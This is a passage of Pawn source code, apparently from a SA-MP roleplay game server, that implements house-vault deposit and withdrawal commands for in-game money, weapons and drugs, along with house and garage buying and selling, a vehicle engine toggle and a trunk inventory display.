    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hwithdraw money [amount]");
     	if(HouseInfo[idx][hMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money in your house vault.");
    	HouseInfo[idx][hMoney] -= amount;
     	GiveZamoraMoney(playerid, amount);
     	format(string, sizeof(string), "* %s opens their vault, takes $%d and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(option, "weapon", true, 4))
    {
     	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hwithdraw weapon [slot]");
        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Weapon slots are between 1 and 5.");
        amount = amount-1;
        if(!HouseInfo[idx][hGun][amount]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a weapon in this slot.");
        GiveZamoraWeapon(playerid, HouseInfo[idx][hGun][amount], HouseInfo[idx][hGunAmmo][amount]);
		format(string, sizeof(string), "* %s opens their vault, takes a %s closes it.", GetName(playerid), RWN(HouseInfo[idx][hGun][amount]));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
     	HouseInfo[idx][hGun][amount] = 0;
		HouseInfo[idx][hGunAmmo][amount] = 0;
    }
    else if(!strcmp(option, "seed", true, 4))
    {
  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hwithdraw seed [amount]");
    	if(HouseInfo[idx][hSeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seed in your house vault.");
    	HouseInfo[idx][hSeed] -= amount;
    	Player[playerid][pSeeds] += amount;
    	format(string, sizeof(string), "* %s opens their vault, takes %d grams of seeds and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(option, "weed", true, 4))
    {
  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hwithdraw Weed [amount]");
    	if(HouseInfo[idx][hWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed in your house vault.");
    	HouseInfo[idx][hWeed] -= amount;
    	Player[playerid][pWeed] += amount;
    	format(string, sizeof(string), "* %s opens their vault, takes %d grams of weed and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(option, "cocaine", true, 4))
    {
    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hwithdraw cocaine [amount]");
    	if(HouseInfo[idx][hcocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine in your house vault.");
    	HouseInfo[idx][hcocaine] -= amount;
    	Player[playerid][pCocaine] += amount;
   	 	format(string, sizeof(string), "* %s opens their vault, takes %d grams of cocaine and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
	return 1;
}


IRP:hdeposit(playerid, var[])
{
	new string[128], option[32], amount, done;
	new idx = Player[playerid][pHouse];
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pHouse] && !Player[playerid][pVHouse]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a house.");
    if(GetPlayerVirtualWorld(playerid)-500 != idx && !Player[playerid][pVHouse]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your house.");
    if(GetPlayerVirtualWorld(playerid)-500 != idx && Player[playerid][pVHouse])
	{
		idx = Player[playerid][pVHouse];
	    if(GetPlayerVirtualWorld(playerid)-500 != idx) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your house.");
	}
	if(sscanf(var, "s[32]", option))
    {
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hdeposit [item]");
        SendClientMessage(playerid, COLOR_GRAD2, "** [ITEMS]: money | weapon | seed | cocaine | Weed");
        format(string, sizeof(string), "** [SAFE]: $%d | %d Weed | %d Cocaine | %d Seed", HouseInfo[idx][hMoney], HouseInfo[idx][hWeed], HouseInfo[idx][hcocaine], HouseInfo[idx][hSeed]);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "** [SAFE]: Weapon 1: %s (%d Ammo) | Weapon 2: %s (%d Ammo) | Weapon 3: %s (%d Ammo)", RWN(HouseInfo[idx][hGun][0]), HouseInfo[idx][hGunAmmo][0], RWN(HouseInfo[idx][hGun][1]), HouseInfo[idx][hGunAmmo][1], RWN(HouseInfo[idx][hGun][2]), HouseInfo[idx][hGunAmmo][2]);
        SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "** [SAFE]: Weapon 4: %s (%d Ammo) | Weapon 5: %s (%d Ammo)", RWN(HouseInfo[idx][hGun][3]), HouseInfo[idx][hGunAmmo][3], RWN(HouseInfo[idx][hGun][4]), HouseInfo[idx][hGunAmmo][4]);
        SendClientMessage(playerid, COLOR_WHITE, string);
		return 1;
    }
	if(!strcmp(option, "money", true, 5))
	{
		if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hdeposit money [amount]");
		if(Player[playerid][pMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		if(amount <= 0) return 0;
		if(!HouseInfo[idx][hsafe] && amount > 25000) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		if(HouseInfo[idx][hsafe] == 1 && amount > 50000) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		HouseInfo[idx][hMoney] += amount;
		GiveZamoraMoney(playerid, -amount);
		format(string, sizeof(string), "* %s opens their vault, puts $%d inside and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else if(!strcmp(option, "weapon", true, 4))
	{
		if(!GetPlayerWeapon(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon in your hand.");
		new tw[2], w[2];
		for(new i=0; i<13; i++)
		{
 			GetPlayerWeaponData(playerid, i, tw[0], tw[1]);
			if(tw[0] == GetPlayerWeapon(playerid))
			{
				w[0] = tw[0];
				w[1] = tw[1];
			}
		}
		if(!HouseInfo[idx][hGun][0])
		{
			HouseInfo[idx][hGun][0] = w[0];
			HouseInfo[idx][hGunAmmo][0] = w[1];
			done = 1;
		}
		else if(!HouseInfo[idx][hGun][1])
		{
			HouseInfo[idx][hGun][1] = w[0];
			HouseInfo[idx][hGunAmmo][1] = w[1];
			done = 1;
		}
		else if(!HouseInfo[idx][hGun][2])
		{
			HouseInfo[idx][hGun][2] = w[0];
			HouseInfo[idx][hGunAmmo][2] = w[1];
			done = 1;
		}
		else if(!HouseInfo[idx][hGun][3] && HouseInfo[idx][hsafe] == 1)
		{
			HouseInfo[idx][hGun][3] = w[0];
			HouseInfo[idx][hGunAmmo][3] = w[1];
			done = 1;
		}
		else if(!HouseInfo[idx][hGun][4] && HouseInfo[idx][hsafe] == 2)
		{
			HouseInfo[idx][hGun][4] = w[0];
			HouseInfo[idx][hGunAmmo][4] = w[1];
			done = 1;
		}
		if(done)
		{
			format(string, sizeof(string), "* %s opens their vault, puts a %s inside and closes it.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			RemoveZamoraWeapon(playerid, w[0]);
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Your house vault can't contain any more weapons.");
	}
	else if(!strcmp(option, "seed", true, 4))
	{
		if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hdeposit seed [amount]");
		if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "Negative numbers? It's not possible to do that.");
		if(Player[playerid][pSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds on you.");
		if(!HouseInfo[idx][hsafe] && amount > 25) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		if(HouseInfo[idx][hsafe] == 1 && amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		HouseInfo[idx][hSeed] += amount;
		Player[playerid][pSeeds] -= amount;
		format(string, sizeof(string), "* %s opens their vault, puts %d grams of seeds inside and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else if(!strcmp(option, "weed", true, 4))
	{
		if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hdeposit Weed [amount]");
		if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "Negative numbers? It's not possible to do that.");
		if(Player[playerid][pWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much Weed on you.");
		if(!HouseInfo[idx][hsafe] && amount > 25) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		if(HouseInfo[idx][hsafe] == 1 && amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		HouseInfo[idx][hWeed] += amount;
		Player[playerid][pWeed] -= amount;
		format(string, sizeof(string), "* %s opens their vault, puts %d grams of weed inside and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else if(!strcmp(option, "cocaine", true, 4))
	{
		if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hdeposit cocaine [amount]");
		if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "Negative numbers? It's not possible to do that.");
		if(Player[playerid][pCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine on you.");
		if(!HouseInfo[idx][hsafe] && amount > 25) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		if(HouseInfo[idx][hsafe] == 1 && amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Too much for this small house safe, Upgrade it first.");
		HouseInfo[idx][hcocaine] += amount;
		Player[playerid][pCocaine] -= amount;
		format(string, sizeof(string), "* %s opens their vault, puts %d grams of cocaine inside and closes it.", GetName(playerid), amount);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	return 1;
}
IRP:upgradehouse(playerid, var[])
{
    new string[128], house, price;
    new idx = Player[playerid][pHouse];
    new idxx = Player[playerid][pVHouse];
    if(sscanf(var, "ds[8]", house, var))
    {
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /upgradehouse [1-2] [confirm]");
        return 1;
    }
	switch(house)
	{
    	case 1:
    	{
           if(!IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ])) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near your house.");
           if(HouseInfo[idx][hLevel] >= 10 && !Player[playerid][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Your house already has the maximum level possible.");
           if(!strcmp(var, "confirm", true))
	       {
	            if(!Player[playerid][pVIP]) price = 100000;
	            if(Player[playerid][pVIP] == 1) price = 87500;
         	    else if(Player[playerid][pVIP] == 2) price = 75000;
        	    else if(Player[playerid][pVIP] == 3) price = 62500;
         	    else if(Player[playerid][pVIP] == 4) price = 50000;
         		if(Player[playerid][pMoney] < price)
         		{
        		    format(string, sizeof(string), "You need $%d to upgrade your house.", price);
         			SendClientMessage(playerid, COLOR_GRAD2, string);
          			return 1;
         		}
         		HouseInfo[idx][hLevel] ++;
           		GiveZamoraMoney(playerid, -price);
         		format(string, sizeof(string), "* You have upgraded your house to level %d.", HouseInfo[idx][hLevel]);
        		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
           		format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
                UpdateDynamic3DTextLabelText(HouseInfo[idx][hText], COLOR_WHITE, string);
        	}
		}
		case 2:
    	{
           if(!IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idxx][hX], HouseInfo[idxx][hY], HouseInfo[idxx][hZ])) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near your house.");
           if(HouseInfo[idxx][hLevel] >= 10 && !Player[playerid][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Your house already has the maximum level possible.");
           if(!strcmp(var, "confirm", true))
	       {
	            if(!Player[playerid][pVIP]) price = 100000;
	            if(Player[playerid][pVIP] == 1) price = 87500;
         	    else if(Player[playerid][pVIP] == 2) price = 75000;
        	    else if(Player[playerid][pVIP] == 3) price = 62500;
         	    else if(Player[playerid][pVIP] == 4) price = 50000;
         		if(Player[playerid][pMoney] < price)
         		{
        		    format(string, sizeof(string), "You need $%d to upgrade your house.", price);
         			SendClientMessage(playerid, COLOR_GRAD2, string);
          			return 1;
         		}
         		HouseInfo[idxx][hLevel] ++;
           		GiveZamoraMoney(playerid, -price);
         		format(string, sizeof(string), "* You have upgraded your house to level %d.", HouseInfo[idxx][hLevel]);
        		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
           		format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idxx][hOwner], HT(idxx), RHS(idxx));
                UpdateDynamic3DTextLabelText(HouseInfo[idxx][hText], COLOR_WHITE, string);
        	}
		}
	}
    return 1;
}
IRP:sellhousetomarket(playerid, var[])
{
	new string[128], done;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pHouse] && !Player[playerid][pVHouse]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a house.");
	if(sscanf(var, "s[8]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellhousetomarket [confirm]");
	if(!strcmp(var, "confirm", true))
	{
	    new idx = Player[playerid][pHouse];
	    if(IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]))
	    {
	        GiveZamoraMoney(playerid, (75*HouseInfo[idx][hPrice])/100);
			HouseInfo[idx][hStatus] = 0;
			HouseInfo[idx][hLevel] = 1;
 	        HouseInfo[idx][hPrice] = 200000;
	   	    HouseInfo[idx][hMoney] = 0;
    	    HouseInfo[idx][hMaterials] = 0;
	   	    HouseInfo[idx][hWeed] = 0;
	   	    HouseInfo[idx][hSeed] = 0;
	   	    HouseInfo[idx][hcocaine] = 0;
	   		HouseInfo[idx][hGun][0] = 0;
	    	HouseInfo[idx][hGunAmmo][0] = 0;
	    	HouseInfo[idx][hGun][1] = 0;
	    	HouseInfo[idx][hGunAmmo][1] = 0;
		   	HouseInfo[idx][hGun][2] = 0;
		   	HouseInfo[idx][hGunAmmo][2] = 0;
	    	HouseInfo[idx][hGun][3] = 0;
		   	HouseInfo[idx][hGunAmmo][3] = 0;
	   		HouseInfo[idx][hGun][4] = 0;
		   	HouseInfo[idx][hGunAmmo][4] = 0;
		    format(HouseInfo[idx][hOwner], 32, "The State");
		    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idx][hOwner], HT(idx), HouseInfo[idx][hPrice]);
    		HouseInfo[idx][hText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]+0.5, 15);
		    Player[playerid][pHouse] = 0;
		    SendClientMessage(playerid, COLOR_INT, " You have successfully sold your house to The State. (75 percent of the original price was paid back)");
            format(string, sizeof(string), "%s has sold house id %d to the market.", GetName(playerid), idx);
			Log("Log/Players/house.log", string);
			done = 1;
	    }
	    new idxx = Player[playerid][pVHouse];
	    if(IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idxx][hX], HouseInfo[idxx][hY], HouseInfo[idxx][hZ]))
	    {
	        GiveZamoraMoney(playerid, (75*HouseInfo[idxx][hPrice])/100);
			HouseInfo[idxx][hStatus] = 0;
			HouseInfo[idxx][hLevel] = 1;
 	        HouseInfo[idxx][hPrice] = 200000;
	   	    HouseInfo[idxx][hMoney] = 0;
    	    HouseInfo[idxx][hMaterials] = 0;
	   	    HouseInfo[idxx][hWeed] = 0;
	   	    HouseInfo[idxx][hSeed] = 0;
	   	    HouseInfo[idxx][hcocaine] = 0;
	   		HouseInfo[idxx][hGun][0] = 0;
	    	HouseInfo[idxx][hGunAmmo][0] = 0;
	    	HouseInfo[idxx][hGun][1] = 0;
	    	HouseInfo[idxx][hGunAmmo][1] = 0;
		   	HouseInfo[idxx][hGun][2] = 0;
		   	HouseInfo[idxx][hGunAmmo][2] = 0;
	    	HouseInfo[idxx][hGun][3] = 0;
		   	HouseInfo[idxx][hGunAmmo][3] = 0;
	   		HouseInfo[idxx][hGun][4] = 0;
		   	HouseInfo[idxx][hGunAmmo][4] = 0;
		    format(HouseInfo[idxx][hOwner], 32, "The State");
		    format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: For Sale\nHouse Price:$%d", HouseInfo[idxx][hOwner], HT(idxx), HouseInfo[idxx][hPrice]);
    		HouseInfo[idxx][hText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, HouseInfo[idxx][hX], HouseInfo[idxx][hY], HouseInfo[idxx][hZ]+0.5, 15);
		    Player[playerid][pVHouse] = 0;
		    SendClientMessage(playerid, COLOR_INT, " You have successfully sold your house to The State. (75 percent of the original price was paid back)");
            format(string, sizeof(string), "%s has sold house id %d to the market.", GetName(playerid), idxx);
			Log("Log/Players/house.log", string);
			done = 1;
	    }
	    if(!done)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "You are not near your house.");
	        return 1;
	    }
    }
	return 1;
}
IRP:buygarage(playerid, var[])
{
	new string[256], done;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pGarage] && Player[playerid][pVGarage] && Player[playerid][pVIP] >= 3) return SendClientMessage(playerid, COLOR_GRAD2, "You already own two garages.");
	if(Player[playerid][pGarage] && Player[playerid][pVIP] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You already own a garage.");
	for(new idx=1; idx<MAX_GARAGES; idx++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
	    {
			if(!strcmp("The State", GarageInfo[idx][gOwner], false))
			{
			    if(Player[playerid][pMoney] < GarageInfo[idx][gPrice]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money to buy this garage.");
				GiveZamoraMoney(playerid, -GarageInfo[idx][gPrice]);
				if(Player[playerid][pGarage]) Player[playerid][pVGarage] = idx;
				else Player[playerid][pGarage] = idx;
			    format(GarageInfo[idx][gOwner], 32, "%s", GetName(playerid));
			    format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
				UpdateDynamic3DTextLabelText(GarageInfo[idx][gText], COLOR_WHITE, string);
				SendClientMessage(playerid, COLOR_INT, " You have successfully bought a garage.");
				SendClientMessage(playerid, COLOR_WHITE, " Type /help to view your garage commands.");
				format(string, sizeof(string), "%s has bought garage id %d.", GetName(playerid), idx);
				Log("Log/Players/garage.log", string);
				idx = MAX_GARAGES;
				done = 1;
			}
			if(idx == MAX_GARAGES-1 && !done)
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "This garage is owned by someone else.");
			}
	    }
	    if(idx == MAX_GARAGES-1 && !done)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "You are not near a buyable garage.");
	    }
	}
	return 1;
}

IRP:sellgaragetomarket(playerid, var[])
{
	new string[256], done;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pGarage] && !Player[playerid][pVGarage]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a garage.");
	if(sscanf(var, "s[8]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellgaragetomarket [confirm]");
	if(!strcmp(var, "confirm", true))
	{
	    new idx = Player[playerid][pGarage];
	    if(IsPlayerInRangeOfPoint(playerid, 2, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
	    {
	        GiveZamoraMoney(playerid, (75*GarageInfo[Player[playerid][pGarage]][gPrice])/100);
			GarageInfo[Player[playerid][pGarage]][gStatus] = 0;
		    format(string, sizeof(string), "Garage Size: %s\nStatus: For Sale\nPrice: $%d", GT(idx), GarageInfo[idx][gPrice]);
		    UpdateDynamic3DTextLabelText(GarageInfo[Player[playerid][pGarage]][gText], COLOR_WHITE, string);
		    Player[playerid][pGarage] = 0;
		    SendClientMessage(playerid, COLOR_INT, " You have successfully sold your garage to The State. (75 percent of the original price was paid back)");
            format(string, sizeof(string), "%s has sold garage id %d to the market.", GetName(playerid), idx);
			Log("Log/Players/garage.log", string);
			done = 1;
	    }
  		new idxx = Player[playerid][pVGarage];
	    if(IsPlayerInRangeOfPoint(playerid, 2, GarageInfo[idxx][gX], GarageInfo[idxx][gY], GarageInfo[idxx][gZ]))
	    {
	        GiveZamoraMoney(playerid, (75*GarageInfo[idxx][gPrice])/100);
			GarageInfo[idxx][gStatus] = 0;
			GarageInfo[idxx][gPrice] = 150000;
		    format(GarageInfo[idxx][gOwner], 32, "The State");
		    format(string, sizeof(string), "Garage Size: %s\nStatus: For Sale\nPrice: $%d", GT(idxx), GarageInfo[idxx][gPrice]);
		    UpdateDynamic3DTextLabelText(GarageInfo[idxx][gText], COLOR_WHITE, string);
		    Player[playerid][pVGarage] = 0;
		    SendClientMessage(playerid, COLOR_INT, " You have successfully sold your garage to The State. (75 percent of the original price was paid back)");
	        format(string, sizeof(string), "%s has sold garage id %d to the market.", GetName(playerid), idxx);
			Log("Log/Players/garage.log", string);
			done = 1;
		}
	    if(!done)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "You are not near your garage.");
	        return 1;
	    }
    }
	return 1;
}
IRP:buyhouse(playerid, var[])
{
	new string[128], done;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pHouse] && Player[playerid][pVHouse] && Player[playerid][pVIP] >= 3) return SendClientMessage(playerid, COLOR_GRAD2, "You already own two houses.");
	if(Player[playerid][pHouse] && Player[playerid][pVIP] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You already own a house.");
	for(new idx=1; idx<MAX_HOUSES; idx++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]))
	    {
			if(!strcmp("The State", HouseInfo[idx][hOwner], false))
			{
			    if(Player[playerid][pMoney] < HouseInfo[idx][hPrice]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a house.");
				GiveZamoraMoney(playerid, -HouseInfo[idx][hPrice]);
				if(Player[playerid][pHouse]) Player[playerid][pVHouse] = idx;
				else Player[playerid][pHouse] = idx;
			    format(HouseInfo[idx][hOwner], 32, "%s", GetAccountName(playerid));
				format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
				UpdateDynamic3DTextLabelText(HouseInfo[idx][hText], COLOR_WHITE, string);
				SendClientMessage(playerid, COLOR_INT, " You have successfully bought a house.");
				SendClientMessage(playerid, COLOR_WHITE, " Type /help to view your house commands.");
				format(string, sizeof(string), "%s has bought house id %d.", GetName(playerid), idx);
				Log("Log/Players/house.log", string);
				idx = MAX_HOUSES;
				done = 1;
			}
			if(idx == MAX_HOUSES-1 && !done)
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "This house is owned by someone else.");
			}
	    }
	    if(idx == MAX_HOUSES-1 && !done)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "You are not near a buyable house.");
	    }
	}
	return 1;
}

IRP:engine(playerid, var[])
{
    new engine, lights, alarm, doors, bonnet, boot, objective, vehicleid, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not driving a vehicle.");
	if(vehicleid == 509 || vehicleid == 481 || vehicleid == 510) return SendClientMessage(playerid, COLOR_GRAD2, "Bicycles have no engine.");
	vehicleid = GetPlayerVehicleID(playerid);
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	if(!engine)
	{
	    SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
	    {SetVehicleParamsEx(vehicleid, 1, lights, alarm, Player[playerid][vLocked], bonnet, boot, objective);}
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
	    {SetVehicleParamsEx(vehicleid, 1, lights, alarm, Player[playerid][vVLocked], bonnet, boot, objective);}
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
	    {SetVehicleParamsEx(vehicleid, 1, lights, alarm, Player[playerid][vVVLocked], bonnet, boot, objective);}
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
	    {SetVehicleParamsEx(vehicleid, 1, lights, alarm, Player[playerid][vVVVLocked], bonnet, boot, objective);}
	    format(string, sizeof(string), "* %s turns the vehicle's engine on.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else
	{
	    SetVehicleParamsEx(vehicleid, 0, lights, alarm, doors, bonnet, boot, objective);
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
	    {SetVehicleParamsEx(vehicleid, 0, lights, alarm, Player[playerid][vLocked], bonnet, boot, objective);}
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
	    {SetVehicleParamsEx(vehicleid, 0, lights, alarm, Player[playerid][vVLocked], bonnet, boot, objective);}
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
	    {SetVehicleParamsEx(vehicleid, 0, lights, alarm, Player[playerid][vVVLocked], bonnet, boot, objective);}
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
	    {SetVehicleParamsEx(vehicleid, 0, lights, alarm, Player[playerid][vVVVLocked], bonnet, boot, objective);}
	    format(string, sizeof(string), "* %s turns the vehicle's engine off.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	return 1;
}
IRP:tbalance(playerid, var[])
{
	new string[128] ,option, done;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(topened[playerid] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You need to open your trunk first.");
   	if(Player[playerid][pVeh] || Player[playerid][pVVeh] || Player[playerid][pVVVeh] || Player[playerid][pVVVVeh])
    {
        new Float:vx, Float:vy, Float:vz;
	    GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "___________________ [TRUNK] __________________");
		        format(string, sizeof(string), " %d/50G Weed | %d/50G Cocaine | %d/50 Seeds", Player[playerid][pTWeed], Player[playerid][pTCocaine], Player[playerid][pTWSeeds]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Low Mats %d/2000 | Medium Mats %d/2000  | High Mats %d/2000", Player[playerid][pLTMaterials], Player[playerid][pMTMaterials], Player[playerid][pHTMaterials]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Weapon 1: %s (%d Ammo) | Weapon 2: %s (%d Ammo)", RWN(Player[playerid][pTGun][0]), Player[playerid][pTGunAmmo][0], RWN(Player[playerid][pTGun][1]), Player[playerid][pTGunAmmo][1]);
				SendClientMessage(playerid, COLOR_WHITE, string);
				return 1;
		    }
			done = 1;
	    }
	    // second vehicle
	    GetVehiclePos(Player[playerid][pVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "___________________ [TRUNK] __________________");
		        format(string, sizeof(string), " %d/50G Weed | %d/50G Cocaine | %d/50 Seeds", Player[playerid][pvTWeed], Player[playerid][pvTCocaine], Player[playerid][pvTWSeeds]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
